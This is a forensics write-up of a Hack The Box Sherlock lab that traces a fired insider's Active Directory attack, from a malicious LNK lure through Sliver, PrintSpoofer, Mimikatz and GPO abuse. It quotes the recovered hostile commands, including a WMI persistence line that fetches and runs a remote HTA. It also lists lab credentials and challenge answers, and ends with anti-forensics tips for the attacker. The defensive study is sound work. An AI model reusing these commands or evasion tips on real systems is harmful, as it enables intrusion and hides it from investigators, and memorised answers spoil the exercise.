Date : 28/07/2026

Sherlock : Caught (Digital Forensics and Incident Response)

.zip : `Caught.zip` - ~79mb - SHA256 `bbb1dabc7a0ec0fb7b34130c5255db7010ad60b20008d4d592296a6acc961db7` - password : `hacktheblue`, as usual for a HTB Sherlock

"Sherlock Scenario

MEGACORP, a leader in tech innovation, recently identified an insider threat: a disgruntled former employee seeking revenge after being fired. Despite having been dismissed, he still had access to the company domain through his office credentials, providing him with the means to infiltrate further. Leveraging his intimate knowledge of the company's defenses, he skillfully destroyed crucial evidence, anticipating where the DFIR team would look for it. However, his meticulous plan had flaws. During the investigation, the DFIR team confiscated his laptop and found fragments of data he had failed to erase. Your mission is to analyze these artifacts and piece together the story behind the breach to uncover the details of the attack."

Two nested archives after unlock: `kali.zip` (attacker laptop leftovers — `exploit/`, `recon/`, `loot/`) and `DC01.zip` (partial Domain Controller disk — `ntds.dit`, `$MFT`, Users, WMI repository, winevt with intentional gaps). Domain face: `MEGACORP.LOCAL`, DC IP in recon `192.168.163.154`.

```bash
> 7z x -p'hacktheblue' Caught.zip -oCaught-analysis -y
> 7z x kali.zip -okali -y && 7z x DC01.zip -oDC01 -y
```

Purple framing first: this is not a smash-and-grab on one Mac. It is an insider with valid domain creds who already knew where Blue would look, wiped the loud EVTX juice, and still left the operator kit + BloodHound snapshot + Mimikatz diary + NTDS delta. Revenge AD campaign — phishing via misconfigured share → Sliver → SYSTEM → credential theft → ACL/GPO abuse → backdoor user + WMI persistence.

Insider identity

BloodHound `users.json` and `ntds.dit` both surface the fired account still alive in the directory: display/CN path resolves to Connor Ball, `sAMAccountName` `cball`, description literally `Former employee – account pending removal.` That is the human behind the laptop fragments. NTDS NTLM for `cball` cracks to `falloutboy` — password hygiene failed twice (weak password + account not disabled after termination).

`ATT&CK ID : Valid Accounts - Domain Accounts T1078.002`

`ATT&CK ID : Account Access Removal failure (defender gap) — account left enabled post-termination`

From here the operator kit on the confiscated Kali-side tree is the attack diary Blue wished Event Logs still held.

Recon against DC01

Autorecon/`_full_tcp_nmap.txt` against `192.168.163.154` shows nineteen TCP ports open — classic DC surface (53 DNS, 88 Kerberos, 389/636 LDAP, 445 SMB, 5985 WinRM, high RPC). That answers the port count and tells SOC the scan was loud `-T4 -p-` class noise.

`ATT&CK ID : Network Service Discovery T1046`

`ATT&CK ID : Active Scanning T1595`

SMB enum on 139/445 is the first real business flaw: share `Office Share` with current-user `READ/WRITE`. Guest-adjacent write into a “payroll/office” share is free staging for an insider who already knows staff will double-click anything that looks like HR.

`ATT&CK ID : Network Share Discovery T1135`

Initial access — LNK on the share

`smb-ls` on that share at collection time still lists the lure pair: `MegaCorp_PayrollAdjustment_Notice.docx.lnk` + fat `MegaCorpServiceWorker.js`. The `.docx.lnk` double extension is classic user-assist bait. Shortcut target parses to:

```text
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Nop -sta -noni -w hidden wscript.exe MegaCorpServiceWorker.js
```

Victim belief: open a payroll Word doc. Reality: hidden PowerShell spawns `wscript` on the JS dropper sitting beside the LNK on the share.

`ATT&CK ID : Phishing - Spearphishing via Service / User Execution T1566 / T1204.002`

`ATT&CK ID : Signed Binary Proxy / Script Interpreters — powershell + wscript T1218 / T1059.005 / T1059.001`

Payload crypto and loader

`MegaCorpServiceWorker.js` is oversized (~28MB) for a reason — embedded Base64 blob, `rc4()` helper, `eval`. Decryption key hardcoded in cleartext: `wdnpmsiaev`. After RC4, the WSH layer deserializes a .NET stager whose entry class is `SharpShooter`, then hands shellcode to `o.Go(sc)`. Hash of that shellcode matches `CAPABLE_TABLETOP.bin` in `exploit/`. YARA against the rebuilt implant lights Sliver.

So stage map on the endpoint: LNK → PowerShell → WScript/JScript → RC4 → SharpShooter in-memory class → Sliver shellcode.

`ATT&CK ID : Obfuscated Files or Information T1027`

`ATT&CK ID : Command and Scripting Interpreter T1059`

`ATT&CK ID : Reflective / in-memory Code Execution (SharpShooter stager) T1620 / T1055-class`

`ATT&CK ID : Application Layer Protocol / C2 — Sliver T1071`

Workstation privilege escalation

`exploit/PrintSpoofer64.exe` is the known SeImpersonate abuse path to `NT AUTHORITY\SYSTEM`. Strings inside `MegaCorpSync.bin` (PrintSpoofer resurfaced as shellcode) show the exact spawn args used to chain into the second implant:

```text
-c c:\windows\tasks\MegaCorpSync.exe
```

`MegaCorpSync.exe` itself carries a PDB breadcrumb: `C:\Users\jigsaw\Source\Repos\OSEP-Code-Snippets\Shellcode Process Hollowing\...` — repo name `OSEP-Code-Snippets` (process hollowing wrapper around the Sliver path). SYSTEM via PrintSpoofer, then hollowed sync-named binary for the elevated beacon.

`ATT&CK ID : Abuse Elevation Control Mechanism / Access Token Manipulation — SeImpersonate / PrintSpoofer T1134 / T1548`

`ATT&CK ID : Process Injection - Process Hollowing T1055.012`

`ATT&CK ID : Masquerading — legitimate-looking MegaCorp* names T1036`

Credential access on WS01

`loot/mimikatz.log` is the smoking gun the insider failed to shred from the laptop. `privilege::debug` OK ⇒ already SYSTEM-class. Interactive logon user `osmith` on host `WS01` (`WS01$` machine account everywhere in the dump). CredMan cache holds plaintext `MEGACORP\mtucker` / `LUmRfx9h22jhpEj`. That is the pivot identity off the workstation into richer AD rights.

Compromised workstation hostname: `WS01`. Compromised interactive SAM account: `osmith`. Cached plaintext pair for lateral: `mtucker:LUmRfx9h22jhpEj`.

`ATT&CK ID : OS Credential Dumping - LSASS Memory T1003.001`

`ATT&CK ID : Credentials from Password Stores / CredMan T1555`

`ATT&CK ID : Unsecured Credentials T1552`

AD privilege path — BloodHound snapshot vs NTDS truth

BloodHound capture (attacker recon) shows `mtucker` initially only in `Developers`. Outbound control: `Developers` holds `GenericAll` on `Engineers` — enough to pull `mtucker` into Engineers. Format the edge the way the Sherlock asks: `Developers,GenericAll,Engineers`.

`ATT&CK ID : Account Discovery / Permission Groups Discovery T1087 / T1069`

`ATT&CK ID : Domain Account Manipulation - Group Membership T1098`

NTDS (post-compromise truth on DC01) shows `mtucker` now in `Administrators,Developers,Engineers` (alpha-sorted). Second hop: `Engineers` has `GenericWrite` on GPO `MEGAPOLICY` → `Engineers,GenericWrite,MEGAPOLICY`. That is the Local Admin delivery belt — edit GPO that applies admin rights / local group assignment rather than guessing a random DA password.

`$MFT` still names the abuse binary the EVTX wipe tried to orphan: `C:\Windows\Tasks\SharpGPOAbuse.exe`.

`ATT&CK ID : Group Policy Modification T1484.001`

`ATT&CK ID : Abuse Elevation Control / Valid Accounts for privileged GPO write T1078 / T1484`

Persistence and the revenge account

Diff BloodHound user set (104) against live `ntds.dit` (105) → new account `rooi`, full name `Robbin Ooi`. Classic insider spare key after the noisy path.

Event logs on DC01 are intentionally thin (Hayabusa/Chainsaw almost dry — he knew where DFIR looks). WMI repository under `C:\Windows\System32\wbem\Repository\` still holds consumer/filter object `RegistryBackup`. Decoded MOF/Base64 command line:

```text
cmd /c 'mshta http://45.123.76.89/MEGACORP_DataSync.hta'
```

External `mshta` second-stage — survives some log deletion because WMI OBJECTS.DATA is not the first place juniors grep after Security.evtx comes back empty.

`ATT&CK ID : Create Account - Domain Account T1136.002`

`ATT&CK ID : Indicator Removal - Clear Windows Event Logs T1070.001` (attempted; incomplete)

`ATT&CK ID : Event Triggered Execution - WMI Event Subscription T1546.003`

`ATT&CK ID : Signed Binary Proxy Execution - Mshta T1218.005`

`ATT&CK ID : Ingress Tool Transfer / Web proto C2 staging T1105 / T1071`

Attack chain - `SIEM + SOC view` :

Valid insider `cball`:`falloutboy` (`T1078.002`) → loud DC recon nineteen ports (`T1046`/`T1595`) → writable `Office Share` (`T1135`) → payroll `.docx.lnk` user execution (`T1204.002`) → hidden PowerShell → `wscript` `MegaCorpServiceWorker.js` (`T1059.001`/`T1059.005`) → RC4 key `wdnpmsiaev` (`T1027`) → `SharpShooter` class loads Sliver shellcode (`T1620`/`T1071`) → PrintSpoofer `SeImpersonatePrivilege` with `-c c:\windows\tasks\MegaCorpSync.exe` (`T1134`) → `OSEP-Code-Snippets` hollowed `MegaCorpSync.exe` as SYSTEM (`T1055.012`/`T1036`) → Mimikatz on `WS01` as `osmith` dumps CredMan `mtucker:LUmRfx9h22jhpEj` (`T1003.001`/`T1555`) → BloodHound path `Developers,GenericAll,Engineers` then `Engineers,GenericWrite,MEGAPOLICY` via `C:\Windows\Tasks\SharpGPOAbuse.exe` (`T1098`/`T1484.001`) → `mtucker` lands `Administrators,Developers,Engineers` → domain user `Robbin Ooi` (`rooi`) (`T1136.002`) → WMI object `RegistryBackup` → `mshta http://45.123.76.89/MEGACORP_DataSync.hta` (`T1546.003`/`T1218.005`) while Security log story is burned (`T1070.001`).

**Blue Team** :

Hunt the share first, not the empty EVTX. `Office Share` WRITE + `.lnk` + sibling `.js` is the IR priority alert that should have fired before PrintSpoofer. Correlate: SMB create on share → parent `explorer`/`powershell -w hidden` → `wscript` → childless network to Sliver C2 → `PrintSpoofer`/`SeImpersonate` → `MegaCorpSync.exe` under `\Windows\Tasks\` → Mimikatz. On the DC side, do not stop when Hayabusa is quiet — parse `$MFT` for `SharpGPOAbuse.exe`, diff BloodHound vs `ntds.dit` for new `rooi`, open WMI repository for non-default consumers (`RegistryBackup`). Disable `cball` yesterday; rotate `mtucker`; delete WMI subscription; block `45.123.76.89` and `mshta` egress.

**Red Team** / operator mistakes that made DFIR possible:

Left the entire `kali` tree (nmap, BloodHound, exploit binaries, Mimikatz log) on the laptop DFIR confiscated. Hardcoded RC4 key in JS. PDB path to `OSEP-Code-Snippets`. PrintSpoofer args recoverable from shellcode strings. Did not remove `SharpGPOAbuse.exe` from `C:\Windows\Tasks`. Burned EVTX but not WMI OBJECTS.DATA, not `$MFT`, not NTDS membership truth. Account description still screams former employee. Revenge ego > OPSEC.

**Purple/Adversary** view :

The insider played Blue’s expected board (wipe logs, know the share, name malware like MegaCorp sync/payroll) and still lost to second-order artifacts. `NTDS` + `$MFT` + WMI + the attacker laptop itself. Hygiene that would have hurt more: never store Mimikatz output or BloodHound zips on a machine that can be seized; stage LNK/JS from memory/C2 without leaving the writeable share smoking; remove GPO abuse binaries; scrub WMI subscriptions; disable or delete `cball` after use so the description does not hand identity to the first BloodHound query. He anticipated where DFIR would look. He did not anticipate that DFIR would look one layer deeper than `EVTX`.
